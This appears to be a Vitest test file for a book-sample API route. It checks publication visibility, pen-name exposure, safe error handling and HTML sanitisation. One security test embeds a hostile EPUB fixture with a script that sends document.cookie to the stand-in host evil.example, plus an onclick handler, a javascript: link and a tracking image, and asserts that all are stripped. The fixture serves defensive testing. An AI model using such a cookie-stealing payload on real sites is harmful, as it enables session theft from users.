import { describe, expect, it, vi, beforeEach } from "vitest";

// LIBRUM 2.0 PRODUCT-1: same mocking discipline as the download route's
// own test file (src/app/api/books/[id]/download/route.test.ts) --
// mocks only the Supabase network boundary, uses a real Buffer/Blob for
// the "manuscript" and the real extractEpubSample() (imported for real,
// not mocked) so these tests also prove the route and the extractor
// actually compose correctly end to end.

const mockCreateClient = vi.fn();
vi.mock("@/lib/supabase/server", () => ({ createClient: () => mockCreateClient() }));
const mockCreateAdminClient = vi.fn();
vi.mock("@/lib/supabase/admin", () => ({ createAdminClient: () => mockCreateAdminClient() }));

const { GET } = await import("./route");
const JSZip = (await import("jszip")).default;

const BOOK_ID = "book-1";

function makeFakeSupabase(overrides: {
  book?: {
    title: string;
    status: string;
    file_path: string | null;
    profiles: { display_name: string; public_author_name?: string | null } | null;
  } | null;
} = {}) {
  const {
    book = {
      title: "Test Book",
      status: "published",
      file_path: "author-1/book-1.epub",
      profiles: { display_name: "Renata Author" },
    },
  } = overrides;

  return {
    from: () => ({
      select: () => ({
        eq: () => ({
          maybeSingle: () => Promise.resolve({ data: book }),
        }),
      }),
    }),
  };
}

function makeFakeAdminClient(overrides: { fileBytes?: Buffer; downloadError?: unknown } = {}) {
  const { fileBytes, downloadError = null } = overrides;
  const download = vi.fn(() =>
    Promise.resolve(
      downloadError || !fileBytes
        ? { data: null, error: downloadError ?? new Error("no file") }
        : { data: new Blob([new Uint8Array(fileBytes)]), error: null },
    ),
  );
  return { storage: { from: () => ({ download }) }, __download: download };
}

async function buildValidEpubBytes(): Promise<Buffer> {
  const zip = new JSZip();
  zip.file("mimetype", "application/epub+zip", { compression: "STORE" });
  zip.file(
    "META-INF/container.xml",
    `<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>`,
  );
  zip.file(
    "OEBPS/content.opf",
    `<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:title>T</dc:title></metadata><manifest><item id="c1" href="c1.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="c1"/></spine></package>`,
  );
  zip.file(
    "OEBPS/c1.xhtml",
    `<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><body><p>${"real sample content word ".repeat(60)}</p></body></html>`,
  );
  return Buffer.from(await zip.generateAsync({ type: "nodebuffer" }));
}

function makeRequest() {
  return new Request(`https://librumal.vercel.app/api/books/${BOOK_ID}/sample`);
}

describe("GET /api/books/[id]/sample", () => {
  beforeEach(() => {
    mockCreateClient.mockClear();
    mockCreateAdminClient.mockClear();
  });

  describe("visibility", () => {
    it("published book with a valid manuscript -> 200 with sanitized sections, no auth required", async () => {
      const fileBytes = await buildValidEpubBytes();
      mockCreateClient.mockResolvedValue(makeFakeSupabase());
      mockCreateAdminClient.mockReturnValue(makeFakeAdminClient({ fileBytes }));

      const response = await GET(makeRequest(), { params: Promise.resolve({ id: BOOK_ID }) });

      expect(response.status).toBe(200);
      const body = await response.json();
      expect(body.bookId).toBe(BOOK_ID);
      expect(body.title).toBe("Test Book");
      expect(body.author).toBe("Renata Author");
      expect(body.sections.length).toBeGreaterThan(0);
      expect(body.sections[0].html).toContain("real sample content");
      expect(typeof body.approximatePercent).toBe("number");
    });

    // LIBRUM 2.0 AUTHOR-1B: this route's "author" field is the one and
    // only place a pseudonymous author's identity is exposed here -- it
    // must be the reader-facing public_author_name, never the private
    // account display_name, whenever the two differ.
    it("author has set a public author name (pen name) -> JSON 'author' is the pen name, never the account display_name", async () => {
      const fileBytes = await buildValidEpubBytes();
      mockCreateClient.mockResolvedValue(
        makeFakeSupabase({
          book: {
            title: "Test Book",
            status: "published",
            file_path: "author-1/book-1.epub",
            profiles: { display_name: "Renata Author", public_author_name: "R. A. Nightingale" },
          },
        }),
      );
      mockCreateAdminClient.mockReturnValue(makeFakeAdminClient({ fileBytes }));

      const response = await GET(makeRequest(), { params: Promise.resolve({ id: BOOK_ID }) });
      const body = await response.json();

      expect(body.author).toBe("R. A. Nightingale");
      const serialized = JSON.stringify(body);
      expect(serialized).not.toContain("Renata Author");
    });

    it("no public author name set -> falls back to the account display_name", async () => {
      const fileBytes = await buildValidEpubBytes();
      mockCreateClient.mockResolvedValue(
        makeFakeSupabase({
          book: {
            title: "Test Book",
            status: "published",
            file_path: "author-1/book-1.epub",
            profiles: { display_name: "Renata Author", public_author_name: null },
          },
        }),
      );
      mockCreateAdminClient.mockReturnValue(makeFakeAdminClient({ fileBytes }));

      const response = await GET(makeRequest(), { params: Promise.resolve({ id: BOOK_ID }) });
      const body = await response.json();

      expect(body.author).toBe("Renata Author");
    });

    it("draft/unpublished book -> 404, never reaches storage", async () => {
      mockCreateClient.mockResolvedValue(
        makeFakeSupabase({
          book: { title: "Draft", status: "draft", file_path: "a/b.epub", profiles: null },
        }),
      );
      const adminClient = makeFakeAdminClient();
      mockCreateAdminClient.mockReturnValue(adminClient);

      const response = await GET(makeRequest(), { params: Promise.resolve({ id: BOOK_ID }) });

      expect(response.status).toBe(404);
      expect(adminClient.__download).not.toHaveBeenCalled();
    });

    it("missing book -> 404, identical shape to a draft (no distinguishing information)", async () => {
      mockCreateClient.mockResolvedValue(makeFakeSupabase({ book: null }));
      mockCreateAdminClient.mockReturnValue(makeFakeAdminClient());

      const response = await GET(makeRequest(), { params: Promise.resolve({ id: BOOK_ID }) });

      expect(response.status).toBe(404);
      const body = await response.json();
      expect(body).toEqual({ error: "not_found" });
    });

    it("published book with no manuscript on file -> 404, never calls storage", async () => {
      mockCreateClient.mockResolvedValue(
        makeFakeSupabase({
          book: { title: "T", status: "published", file_path: null, profiles: null },
        }),
      );
      const adminClient = makeFakeAdminClient();
      mockCreateAdminClient.mockReturnValue(adminClient);

      const response = await GET(makeRequest(), { params: Promise.resolve({ id: BOOK_ID }) });

      expect(response.status).toBe(404);
      expect(adminClient.__download).not.toHaveBeenCalled();
    });
  });

  describe("controlled failure", () => {
    it("storage download error -> 404, no leaked Supabase error detail", async () => {
      mockCreateClient.mockResolvedValue(makeFakeSupabase());
      mockCreateAdminClient.mockReturnValue(
        makeFakeAdminClient({ downloadError: { message: "internal supabase detail", code: "X" } }),
      );

      const response = await GET(makeRequest(), { params: Promise.resolve({ id: BOOK_ID }) });

      expect(response.status).toBe(404);
      const body = await response.json();
      const serialized = JSON.stringify(body);
      expect(serialized).not.toContain("internal supabase detail");
    });

    it("unreadable/malformed manuscript -> 404, safe controlled failure, not a 500", async () => {
      mockCreateClient.mockResolvedValue(makeFakeSupabase());
      mockCreateAdminClient.mockReturnValue(
        makeFakeAdminClient({ fileBytes: Buffer.from("not actually a zip") }),
      );

      const response = await GET(makeRequest(), { params: Promise.resolve({ id: BOOK_ID }) });

      expect(response.status).toBe(404);
    });
  });

  describe("security -- response payload", () => {
    it("never includes the manuscript storage path or any signed/storage URL", async () => {
      const fileBytes = await buildValidEpubBytes();
      mockCreateClient.mockResolvedValue(makeFakeSupabase());
      mockCreateAdminClient.mockReturnValue(makeFakeAdminClient({ fileBytes }));

      const response = await GET(makeRequest(), { params: Promise.resolve({ id: BOOK_ID }) });
      const serialized = JSON.stringify(await response.json());

      expect(serialized).not.toContain("author-1/book-1.epub");
      expect(serialized).not.toContain("manuscript_path");
      expect(serialized).not.toContain("supabase.co");
      expect(serialized).not.toContain("/storage/v1/");
      expect(serialized).not.toContain("service_role");
    });

    // LIBRUM 2.0 PRODUCT-1 PRE-COMMIT HARDENING: pins the actual render
    // boundary end to end -- sections[].html here is EXACTLY the value
    // src/components/book-sample-reader.tsx passes to
    // dangerouslySetInnerHTML, unmodified in between. A hostile
    // manuscript (script tag, event-handler attribute, javascript: link)
    // goes in; the live JSON response coming back out must contain only
    // the fixed allowed-tag vocabulary, with zero attributes on any tag.
    it("a hostile manuscript's script/event-handler/javascript: content never survives into the JSON sections payload", async () => {
      const zip = new JSZip();
      zip.file("mimetype", "application/epub+zip", { compression: "STORE" });
      zip.file(
        "META-INF/container.xml",
        `<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>`,
      );
      zip.file(
        "OEBPS/content.opf",
        `<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:title>T</dc:title></metadata><manifest><item id="c1" href="c1.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="c1"/></spine></package>`,
      );
      zip.file(
        "OEBPS/c1.xhtml",
        `<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><body>` +
          `<p onclick="steal()">Real content ${"word ".repeat(60)}</p>` +
          `<script>document.location='https://evil.example/'+document.cookie</script>` +
          `<a href="javascript:alert(1)">click</a>` +
          `<img src="https://evil.example/track.png"/>` +
          `</body></html>`,
      );
      const fileBytes = Buffer.from(await zip.generateAsync({ type: "nodebuffer" }));

      mockCreateClient.mockResolvedValue(makeFakeSupabase());
      mockCreateAdminClient.mockReturnValue(makeFakeAdminClient({ fileBytes }));

      const response = await GET(makeRequest(), { params: Promise.resolve({ id: BOOK_ID }) });
      const body = await response.json();

      expect(response.status).toBe(200);
      const allHtml: string = body.sections.map((s: { html: string }) => s.html).join("");

      expect(allHtml).not.toContain("steal");
      expect(allHtml).not.toContain("document.cookie");
      expect(allHtml).not.toContain("evil.example");
      expect(allHtml).not.toContain("javascript:");
      expect(allHtml).not.toMatch(/<script/i);
      expect(allHtml).not.toMatch(/<img/i);
      expect(allHtml).not.toMatch(/<a[\s>]/i);
      // Every tag present is from the fixed allowed vocabulary, and
      // none of them carry any attribute at all.
      const tagNames = [...allHtml.matchAll(/<\/?([a-zA-Z0-9]+)[^>]*>/g)].map((m) => m[1].toLowerCase());
      const ALLOWED = new Set([
        "p", "h1", "h2", "h3", "h4", "h5", "h6", "blockquote",
        "em", "strong", "i", "b", "br", "hr", "ul", "ol", "li", "small", "sup", "sub",
      ]);
      for (const tag of tagNames) {
        expect(ALLOWED.has(tag)).toBe(true);
      }
      expect(allHtml).not.toMatch(/<[a-zA-Z][^>]*=/);
      expect(allHtml).toContain("Real content");
    });
  });
});
